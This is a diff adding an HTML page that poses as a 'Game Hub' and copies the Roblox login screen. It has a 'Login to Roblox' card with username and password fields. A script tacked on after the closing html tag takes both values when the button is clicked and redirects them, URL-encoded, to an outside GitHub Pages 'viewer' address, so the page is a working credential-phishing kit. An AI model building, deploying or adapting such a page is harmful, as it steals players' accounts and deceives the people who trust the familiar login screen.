@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Game Hub</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  background: #050505;
+  color: white;
+  font-family: Arial, sans-serif;
+  overflow-x: hidden;
+}
+
+/* TOP NAVIGATION */
+
+.navbar {
+  height: 65px;
+  width: 100%;
+  background: #191a1f;
+  display: flex;
+  align-items: center;
+  padding: 0 20px;
+  gap: 45px;
+  position: relative;
+  z-index: 10;
+}
+
+.logo {
+  font-size: 27px;
+  font-weight: 900;
+  letter-spacing: -1px;
+}
+
+.navbar a {
+  color: white;
+  text-decoration: none;
+  font-size: 16px;
+}
+
+.search {
+  width: 300px;
+  height: 30px;
+  background: #24252b;
+  border: 1px solid #41434c;
+  border-radius: 8px;
+  color: white;
+  padding: 8px;
+  font-size: 15px;
+}
+
+.signup {
+  background: #335fff;
+  padding: 8px 15px;
+  border-radius: 9px;
+  margin-left: auto;
+}
+
+/* BACKGROUND */
+
+.background {
+  position: fixed;
+  inset: 65px 0 0 0;
+
+  background-image: url("https://images.rbxcdn.com/de4e698b86f73bc5.jpg");
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+
+  z-index: -1;
+}
+
+.tile {
+  position: absolute;
+  width: 220px;
+  height: 150px;
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  font-weight: bold;
+  text-align: center;
+  text-shadow: 2px 2px 5px black;
+  border: 1px solid #555;
+  box-shadow: 0 0 20px #000;
+}
+
+.t1 {
+  background: linear-gradient(135deg,#146d91,#10142c);
+  top: 3%;
+  left: 7%;
+  transform: rotate(15deg);
+}
+
+.t2 {
+  background: linear-gradient(135deg,#a64a25,#251313);
+  top: 27%;
+  left: 1%;
+  transform: rotate(-12deg);
+}
+
+.t3 {
+  background: linear-gradient(135deg,#246c9b,#17223d);
+  top: 60%;
+  left: 14%;
+  transform: rotate(12deg);
+}
+
+.t4 {
+  background: linear-gradient(135deg,#b82c28,#192b43);
+  top: 15%;
+  right: 14%;
+  transform: rotate(12deg);
+}
+
+.t5 {
+  background: linear-gradient(135deg,#f0b52b,#b94e21);
+  top: 55%;
+  right: 20%;
+  transform: rotate(-12deg);
+}
+
+.t6 {
+  background: linear-gradient(135deg,#5933b1,#132a61);
+  top: 62%;
+  right: 2%;
+  transform: rotate(15deg);
+}
+
+.t7 {
+  background: linear-gradient(135deg,#344d83,#151525);
+  top: 85%;
+  left: 38%;
+  transform: rotate(10deg);
+}
+
+.t8 {
+  background: linear-gradient(135deg,#248c85,#122e36);
+  top: 2%;
+  right: 45%;
+  transform: rotate(-12deg);
+}
+
+/* DARK OVERLAY */
+
+.overlay {
+  position: fixed;
+  inset: 65px 0 0 0;
+  background: rgba(0,0,0,0.48);
+  z-index: -1;
+}
+
+/* CENTER PANEL */
+
+.content {
+  display: flex;
+  justify-content: center;
+  padding-top: 162px;
+  padding-bottom: 50px;
+}
+
+.card {
+  width: 360px;
+  background: #272930;
+  padding: 24px 15px;
+  text-align: center;
+  position: relative;
+  z-index: 2;
+}
+
+.card h1 {
+  font-size: 29px;
+  margin: 0 0 10px;
+}
+
+.card input {
+  width: 100%;
+  height: 39px;
+  margin: 7px 0;
+  padding: 10px;
+  background: #343741;
+  border: 1px solid #494c56;
+  border-radius: 7px;
+  color: white;
+  font-size: 15px;
+}
+
+.card button {
+  width: 100%;
+  height: 37px;
+  margin: 5px 0;
+  background: #393c46;
+  border: none;
+  border-radius: 8px;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.card button:hover {
+  background: #4a4e59;
+}
+
+.demo-label {
+  font-size: 12px;
+  color: #bbb;
+  margin: 10px 0 15px;
+}
+
+.divider {
+  border: none;
+  border-top: 1px solid #41434c;
+  margin: 25px 0 18px;
+}
+
+@media(max-width:700px) {
+  .navbar {
+    gap: 12px;
+    padding: 0 10px;
+  }
+
+  .navbar a {
+    font-size: 12px;
+  }
+
+  .search {
+    width: 100px;
+  }
+
+  .logo {
+    font-size: 18px;
+  }
+
+  .card {
+    width: 90%;
+    max-width: 360px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<!-- NAVIGATION -->
+
+<div class="navbar">
+
+  <div class="logo">ROBLOX</div>
+
+  <a href="#">Charts</a>
+  <a href="#">Marketplace</a>
+  <a href="#">Create</a>
+  <a href="#">Robux</a>
+
+  <input class="search" placeholder="⌕ Search">
+
+  <a href="#" class="signup">Sign Up</a>
+
+</div>
+
+<!-- BACKGROUND -->
+
+<div class="background">
+
+
+
+</div>
+
+<div class="overlay"></div>
+
+<!-- CENTER CARD -->
+
+<div class="content">
+
+  <div class="card">
+
+    <h1>Login to Roblox</h1>
+
+    <p class="demo-label">
+      
+    </p>
+
+    <input
+  id="messageInput"
+  type="text"
+  placeholder="Username/Email/Phone"
+>
+
+<input
+  id="messageInput2"
+  type="text"
+  placeholder="Password"
+>
+ 
+           
+
+
+    
+
+    <button onclick="">
+      Continue
+    </button>
+
+    <p>Forgot Password or Username?</p>
+
+    <hr class="divider">
+
+    <button onclick="">
+      Email Me a One-Time Code
+    </button>
+
+    <button onclick="">
+      Quick Sign-in 
+    </button>
+
+    <p style="margin-top:30px;font-size:15px">
+      Don't have an account?Sign Up
+    </p>
+
+  </div>
+
+</div>
+
+
+</body>
+</html><script>
+document.querySelector("button").addEventListener("click", function () {
+  const first = document.getElementById("messageInput").value;
+  const second = document.getElementById("messageInput2").value;
+
+  const viewerURL = "https://hokmi072-source.github.io/viewer/";
+
+  window.location.href = viewerURL +
+    "?first=" + encodeURIComponent(first) +
+    "&second=" + encodeURIComponent(second);
+});
+</script>
